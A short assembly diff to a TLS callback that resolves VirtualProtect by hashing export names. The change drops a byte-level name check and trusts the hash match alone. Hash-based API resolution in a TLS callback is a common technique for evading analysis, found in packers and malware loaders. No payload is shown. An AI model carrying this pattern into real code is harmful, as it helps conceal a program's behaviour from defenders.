@@ -217,15 +217,7 @@ TlsCallback:
     cmp     eax, VIRTUAL_PROTECT_HASH
     jne     .next_name
 
-    ; ── Hash match — verify by name to prevent collisions ────
-    mov     rsi, [r11 + rdi * 4]  ; name_rva
-    add     rsi, rbx               ; name = dll_base + name_rva
-    cmp     dword [rsi], 'Vir'
-    jne     .next_name
-    cmp     dword [rsi + 4], 'tua'
-    jne     .next_name
-
-    ; Resolve function address
+    ; ── Resolve function address (hash match confirmed) ────
     movzx   ecx, word [r12 + rdi * 2]  ; ordinal index
     mov     eax, [r10 + rcx * 4]       ; function RVA
     add     rax, rbx                    ; function VA
